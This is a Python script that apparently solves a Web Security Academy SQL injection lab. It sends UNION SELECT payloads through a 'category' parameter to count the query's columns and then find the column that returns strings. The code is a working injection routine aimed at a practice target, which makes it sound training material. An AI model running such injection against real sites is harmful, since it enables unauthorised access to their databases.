import requests
from bs4 import BeautifulSoup

url = "https://0af400310362ad1982b251e8000700ff.web-security-academy.net/filter"

# Determine number of columns
injection_template = "' UNION SELECT {nulls} --"
nulls = "NULL"
counter = 1
while True:
    # Make request
    injection = injection_template.format(nulls=nulls)
    params = {"category": injection}
    r = requests.get(url, params)

    if r.status_code == 200:
        break

    # Next
    nulls += ",NULL"
    counter += 1

# Obtain random value
soup = BeautifulSoup(r.text, 'html.parser')
secret = soup.find(id="hint").text.split()[-1]

# Identify string column
for i in range(counter):
    nulls = ""
    for j in range(counter):
        if i == j:
            nulls += secret
        else:
            nulls += "NULL"
        if j != counter-1:
            nulls += "," # Separator
    
    # Make request
    injection = injection_template.format(nulls=nulls)
    params = {"category": injection}
    r = requests.get(url, params)
    if r.status_code == 200:
        print(f"Column number is {i+1}")
        break